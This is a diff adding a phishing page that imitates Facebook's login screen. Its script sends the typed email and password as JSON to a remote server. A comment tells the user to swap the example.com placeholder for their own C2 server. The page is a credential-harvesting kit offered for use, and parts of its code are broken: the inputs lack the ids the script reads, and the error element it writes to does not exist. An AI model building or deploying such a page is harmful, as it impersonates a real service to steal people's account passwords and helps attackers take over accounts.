@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login To Facebook</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <style>
+        input {
+            border-radius: 5px;
+            height: 30px;
+        }
+        .Items {
+            text-align: center;
+            align-items: center;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            width: 300px;
+            margin: auto;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            padding: 20px;
+            background-color: #f9f9f9;
+        }
+        .image {
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        body {
+            font-family: 'Roboto', sans-serif;
+        }
+    </style>
+    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse4.mm.bing.net%2Fth%2Fid%2FOIP.KCzWnbfabdUUli4v25y-_AHaEK%3Fpid%3DApi&f=1&ipt=531fd84db39aa8d6dc36c9cddd7fa19f9ad63bd747d5f80a4974e1a39505f596&ipo=images" class="image">
+    <div class="Items">
+    <p>Log Into Facebook</p>
+    <form method="post" action="submit()" id="loginForm">
+        <input type="email" placeholder="Email Or Phone Number"><br><br>
+        <input type="password" placeholder="Password">
+    </form><br>
+    <a href="">Forgot account? · Sign up for Facebook</a>
+    </div>
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            if (!email || !password) {
+                document.getElementById("error").innerHTML = "Please fill in both fields.";
+                return;
+            }
+
+            document.getElementById("error").innerHTML = "";
+
+            fetch('example.com', { //IMPORTANT!!! Add your C2 server/ server! DO NOT USE EXAMPLE.COM
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email: email, password: password })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Login successful!");
+                } else {
+                    document.getElementById("error").innerHTML = "Invalid credentials!";
+                }
+            })
+            .catch(error => {
+                document.getElementById("error").innerHTML = "Ooops something went wrong!";
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
